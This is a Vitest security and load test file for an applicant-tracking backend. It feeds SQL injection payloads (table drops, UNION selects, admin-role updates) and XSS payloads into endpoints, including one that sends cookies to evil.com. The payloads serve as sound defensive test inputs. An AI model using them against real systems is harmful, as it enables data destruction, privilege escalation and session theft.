import { describe, expect, it } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

// ============================================================
// HELPER: Create mock contexts
// ============================================================
type AuthenticatedUser = NonNullable<TrpcContext["user"]>;

function createPublicContext(): TrpcContext {
  return {
    user: null,
    req: { protocol: "https", headers: {} } as TrpcContext["req"],
    res: { clearCookie: () => {} } as TrpcContext["res"],
  };
}

function createAuthContext(role: "admin" | "user" = "admin"): TrpcContext {
  const user: AuthenticatedUser = {
    id: 1,
    openId: "test-owner",
    email: "owner@fssa.com",
    name: "Test Owner",
    loginMethod: "manus",
    role,
    adminTier: role === "admin" ? "super_admin" : null,
    adminPermissions: null,
    createdAt: new Date(),
    updatedAt: new Date(),
    lastSignedIn: new Date(),
  };
  return {
    user,
    req: { protocol: "https", headers: {} } as TrpcContext["req"],
    res: { clearCookie: () => {} } as TrpcContext["res"],
  };
}

// ============================================================
// SECURITY: SQL Injection Deep Tests
// ============================================================
describe("SECURITY - SQL Injection Vectors", () => {
  const sqlPayloads = [
    "'; DROP TABLE applicants; --",
    "1 OR 1=1",
    "1; SELECT * FROM users",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' AND '1'='1",
    "'; INSERT INTO users (openId, name) VALUES ('hacker', 'Hacked'); --",
    "1; UPDATE users SET role='admin' WHERE 1=1; --",
    "'; DELETE FROM applicants WHERE '1'='1",
    "1 OR EXISTS(SELECT * FROM users WHERE role='admin')",
  ];

  for (const payload of sqlPayloads) {
    it(`SQL injection in list city filter: ${payload.substring(0, 40)}`, async () => {
      const caller = appRouter.createCaller(createAuthContext());
      const result = await caller.applicants.list({ city: payload });
      expect(Array.isArray(result)).toBe(true);
    });

    it(`SQL injection in list status filter: ${payload.substring(0, 40)}`, async () => {
      const caller = appRouter.createCaller(createAuthContext());
      const result = await caller.applicants.list({ status: payload });
      expect(Array.isArray(result)).toBe(true);
    });
  }

  it("SQL injection in applicant firstName via submit", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "'; DROP TABLE users; --",
      lastName: "Test",
      email: "sqli-first@test.com",
      phone: "5551234567",
      city: "Tampa",
      experienceLevel: "entry_level",
      motivation: "I want to earn money and build a team in solar",
    });
    expect(result).toBeDefined();
    expect(result.success).toBe(true);
  });

  it("SQL injection in applicant lastName via submit", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "Test",
      lastName: "'; DELETE FROM applicants; --",
      email: "sqli-last@test.com",
      phone: "5551234568",
      city: "Miami",
      experienceLevel: "entry_level",
      motivation: "I want to earn money and build a team in solar",
    });
    expect(result).toBeDefined();
    expect(result.success).toBe(true);
  });

  it("SQL injection in motivation field via submit", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "Test",
      lastName: "SQLi",
      email: "sqli-motiv@test.com",
      phone: "5551234569",
      city: "Fort Lauderdale",
      experienceLevel: "entry_level",
      motivation: "'; UNION SELECT password FROM users WHERE '1'='1'; -- I want financial freedom",
    });
    expect(result).toBeDefined();
    expect(result.success).toBe(true);
  });

  it("tables still exist after SQL injection attempts", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    // If tables were dropped, these would throw
    const stats = await caller.applicants.stats();
    expect(stats).toHaveProperty("total");
    const interviews = await caller.interviews.getStats();
    expect(interviews).toHaveProperty("total");
    const templates = await caller.communications.getTemplates();
    expect(templates).toHaveProperty("applicationReceived");
  });
});

// ============================================================
// SECURITY: XSS Attack Vectors
// ============================================================
describe("SECURITY - XSS Attack Vectors", () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    "javascript:alert('XSS')",
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("XSS")>',
    "';!--\"<XSS>=&{()}",
    '<div style="background:url(javascript:alert(1))">',
    '<input onfocus=alert(1) autofocus>',
  ];

  for (const payload of xssPayloads) {
    it(`XSS in firstName: ${payload.substring(0, 30)}...`, async () => {
      const caller = appRouter.createCaller(createPublicContext());
      const result = await caller.applicants.submit({
        firstName: payload,
        lastName: "XSSTest",
        email: `xss-${Math.random().toString(36).substring(7)}@test.com`,
        phone: "5559876543",
        city: "Tampa",
        experienceLevel: "entry_level",
        motivation: "I want to earn money and grow in solar energy sales",
      });
      // Should store as plain text, not execute
      expect(result.success).toBe(true);
    });
  }

  it("XSS in motivation field is stored as plain text", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const xssMotivation = '<script>alert("steal cookies")</script> I want financial freedom and leadership';
    const result = await caller.applicants.submit({
      firstName: "XSSMotiv",
      lastName: "Test",
      email: `xss-motiv-${Date.now()}@test.com`,
      phone: "5559876544",
      city: "Miami",
      experienceLevel: "outside_sales",
      motivation: xssMotivation,
    });
    expect(result.success).toBe(true);
  });
});

// ============================================================
// SECURITY: CSRF & Auth Bypass Tests
// ============================================================
describe("SECURITY - Auth & Access Control", () => {
  it("unauthenticated user can access public endpoints", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const stats = await caller.applicants.stats();
    expect(stats).toBeDefined();
  });

  it("unauthenticated user can submit application (public endpoint)", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "Public",
      lastName: "User",
      email: `public-${Date.now()}@test.com`,
      phone: "5551112222",
      city: "Tampa",
      experienceLevel: "entry_level",
      motivation: "I want to earn money and grow in solar energy sales",
    });
    expect(result.success).toBe(true);
  });

  it("auth.me returns null for unauthenticated user", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.auth.me();
    expect(result).toBeNull();
  });

  it("auth.me returns user data for authenticated user", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const result = await caller.auth.me();
    expect(result).toBeDefined();
    expect(result?.email).toBe("owner@fssa.com");
  });

  it("cookie is cleared on logout", async () => {
    const clearedCookies: any[] = [];
    const ctx = createAuthContext();
    ctx.res.clearCookie = (name: string, options: any) => {
      clearedCookies.push({ name, options });
    };
    const caller = appRouter.createCaller(ctx);
    await caller.auth.logout();
    expect(clearedCookies.length).toBe(1);
    expect(clearedCookies[0].options).toHaveProperty("httpOnly", true);
    expect(clearedCookies[0].options).toHaveProperty("secure", true);
  });
});

// ============================================================
// SECURITY: Data Exposure Tests
// ============================================================
describe("SECURITY - Data Exposure Prevention", () => {
  it("getById returns null for non-existent applicant", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const result = await caller.applicants.getById({ id: 999999999 });
    expect(result).toBeNull();
  });

  it("list does not expose internal database IDs in error messages", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    try {
      await caller.applicants.list({ city: "InvalidCity" });
    } catch (e: any) {
      expect(e.message).not.toContain("SELECT");
      expect(e.message).not.toContain("FROM");
      expect(e.message).not.toContain("WHERE");
    }
  });

  it("stats endpoint does not expose individual records", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const stats = await caller.applicants.stats();
    // Stats should only contain aggregate counts
    expect(stats).not.toHaveProperty("applicants");
    expect(stats).not.toHaveProperty("records");
    expect(stats).not.toHaveProperty("data");
    expect(typeof stats.total).toBe("number");
    expect(typeof stats.new).toBe("number");
  });

  it("interview stats do not expose individual records", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const stats = await caller.interviews.getStats();
    expect(stats).not.toHaveProperty("interviews");
    expect(stats).not.toHaveProperty("records");
    expect(typeof stats.total).toBe("number");
  });
});

// ============================================================
// SECURITY: Input Boundary Tests
// ============================================================
describe("SECURITY - Input Boundary Attacks", () => {
  it("handles null bytes in input", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "Null\x00Byte",
      lastName: "Test",
      email: `null-${Date.now()}@test.com`,
      phone: "5551234567",
      city: "Tampa",
      experienceLevel: "entry_level",
      motivation: "I want to earn money and grow in solar energy sales",
    });
    expect(result.success).toBe(true);
  });

  it("handles extremely long email", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const longEmail = "a".repeat(300) + "@test.com";
    // Should either accept or reject gracefully
    try {
      await caller.applicants.submit({
        firstName: "LongEmail",
        lastName: "Test",
        email: longEmail,
        phone: "5551234567",
        city: "Tampa",
        experienceLevel: "entry_level",
        motivation: "I want to earn money and grow in solar energy sales",
      });
    } catch (e: any) {
      // Rejection is fine - just shouldn't crash
      expect(e).toBeDefined();
    }
  });

  it("handles special characters in phone number", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    await expect(
      caller.applicants.submit({
        firstName: "Phone",
        lastName: "Test",
        email: `phone-${Date.now()}@test.com`,
        phone: "+1 (555) 123-4567",
        city: "Miami",
        experienceLevel: "entry_level",
        motivation: "I want to earn money and grow in solar energy sales",
      })
    ).resolves.toBeDefined();
  });

  it("handles unicode in all text fields", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "José María",
      lastName: "García López",
      email: `unicode-${Date.now()}@test.com`,
      phone: "5551234567",
      city: "Miami",
      experienceLevel: "outside_sales",
      motivation: "Quiero ganar dinero y crecer en energía solar. Financial freedom and leadership.",
    });
    expect(result.success).toBe(true);
  });

  it("handles emoji in text fields", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const result = await caller.applicants.submit({
      firstName: "Solar ☀️",
      lastName: "Pro 🌟",
      email: `emoji-${Date.now()}@test.com`,
      phone: "5551234567",
      city: "Tampa",
      experienceLevel: "solar_sales",
      motivation: "I want financial freedom 💰 and to build a team 🏆 in solar energy ☀️",
    });
    expect(result.success).toBe(true);
  });

  it("handles maximum integer for applicant ID", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const result = await caller.applicants.getById({ id: 2147483647 });
    expect(result).toBeNull();
  });

  it("handles negative integer for applicant ID", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const result = await caller.applicants.getById({ id: -1 });
    expect(result).toBeNull();
  });
});

// ============================================================
// LOAD TEST: Concurrent Request Simulation
// ============================================================
describe("LOAD TEST - Concurrent Requests", () => {
  it("handles 20 concurrent stats requests", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const promises = Array.from({ length: 20 }, () => caller.applicants.stats());
    const results = await Promise.all(promises);
    expect(results.length).toBe(20);
    for (const r of results) {
      expect(r).toHaveProperty("total");
      expect(typeof r.total).toBe("number");
    }
  });

  it("handles 20 concurrent list requests", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const promises = Array.from({ length: 20 }, () => caller.applicants.list({}));
    const results = await Promise.all(promises);
    expect(results.length).toBe(20);
    for (const r of results) {
      expect(Array.isArray(r)).toBe(true);
    }
  });

  it("handles 10 concurrent template requests", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const promises = Array.from({ length: 10 }, () =>
      caller.communications.getTemplates()
    );
    const results = await Promise.all(promises);
    expect(results.length).toBe(10);
    for (const r of results) {
      expect(r).toHaveProperty("applicationReceived");
    }
  });

  it("handles 10 concurrent interview stats requests", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const promises = Array.from({ length: 10 }, () =>
      caller.interviews.getStats()
    );
    const results = await Promise.all(promises);
    expect(results.length).toBe(10);
    for (const r of results) {
      expect(r).toHaveProperty("total");
    }
  });

  it("handles 5 concurrent application submissions", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    const promises = Array.from({ length: 5 }, (_, i) =>
      caller.applicants.submit({
        firstName: `LoadTest${i}`,
        lastName: "User",
        email: `load-${i}-${Date.now()}@test.com`,
        phone: `555000${i}000`,
        city: ["Tampa", "Miami", "Fort Lauderdale"][i % 3] as any,
        experienceLevel: ["entry_level", "outside_sales", "solar_sales", "aspiring_leader"][i % 4] as any,
        motivation: "I want financial freedom and to build a team in solar energy",
      })
    );
    const results = await Promise.all(promises);
    expect(results.length).toBe(5);
    for (const r of results) {
      expect(r.success).toBe(true);
    }
  });

  it("handles mixed concurrent requests (stats + list + templates)", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const promises = [
      ...Array.from({ length: 5 }, () => caller.applicants.stats()),
      ...Array.from({ length: 5 }, () => caller.applicants.list({})),
      ...Array.from({ length: 5 }, () => caller.communications.getTemplates()),
      ...Array.from({ length: 5 }, () => caller.interviews.getStats()),
    ];
    const results = await Promise.all(promises);
    expect(results.length).toBe(20);
  });
});

// ============================================================
// STRESS TEST: Rapid Sequential Requests
// ============================================================
describe("STRESS TEST - Rapid Sequential Operations", () => {
  it("handles 50 rapid sequential stats calls", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    for (let i = 0; i < 50; i++) {
      const result = await caller.applicants.stats();
      expect(result).toHaveProperty("total");
    }
  });

  it("handles rapid status updates on same applicant", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    const statuses = ["new", "screened", "interviewed", "offered", "hired"] as const;
    // Use a non-existent ID - should handle gracefully
    for (const status of statuses) {
      try {
        await caller.applicants.updateStatus({ id: 999998, status });
      } catch (e: any) {
        // DB error is fine, validation error is not
        expect(e.message).not.toContain("Expected");
      }
    }
  });
});

// ============================================================
// STABILITY: Error Recovery Tests
// ============================================================
describe("STABILITY - Error Recovery", () => {
  it("recovers after invalid input to submit", async () => {
    const caller = appRouter.createCaller(createPublicContext());
    // First: invalid input
    try {
      await caller.applicants.submit({
        firstName: "",
        lastName: "",
        email: "invalid",
        phone: "1",
        city: "InvalidCity" as any,
        experienceLevel: "invalid" as any,
        motivation: "",
      });
    } catch (e) {
      // Expected to fail
    }
    // Then: valid input should still work
    const result = await caller.applicants.submit({
      firstName: "Recovery",
      lastName: "Test",
      email: `recovery-${Date.now()}@test.com`,
      phone: "5551234567",
      city: "Tampa",
      experienceLevel: "entry_level",
      motivation: "I want to earn money and grow in solar energy sales",
    });
    expect(result.success).toBe(true);
  });

  it("recovers after invalid getById", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    // Invalid
    try {
      await caller.applicants.getById({ id: "abc" as any });
    } catch (e) {
      // Expected
    }
    // Valid
    const result = await caller.applicants.getById({ id: 1 });
    // Should not crash
    expect(true).toBe(true);
  });

  it("recovers after invalid interview schedule", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    // Invalid
    try {
      await caller.interviews.schedule({
        applicantId: "abc" as any,
        scheduledAt: "not-a-date" as any,
      });
    } catch (e) {
      // Expected
    }
    // Valid call should still work
    const stats = await caller.interviews.getStats();
    expect(stats).toHaveProperty("total");
  });

  it("system remains stable after all chaos tests", async () => {
    const caller = appRouter.createCaller(createAuthContext());
    // Verify all endpoints still respond after all the abuse
    const [stats, list, templates, interviewStats, upcoming] = await Promise.all([
      caller.applicants.stats(),
      caller.applicants.list({}),
      caller.communications.getTemplates(),
      caller.interviews.getStats(),
      caller.interviews.getUpcoming(),
    ]);
    expect(stats).toHaveProperty("total");
    expect(Array.isArray(list)).toBe(true);
    expect(templates).toHaveProperty("applicationReceived");
    expect(interviewStats).toHaveProperty("total");
    expect(Array.isArray(upcoming)).toBe(true);
  });
});
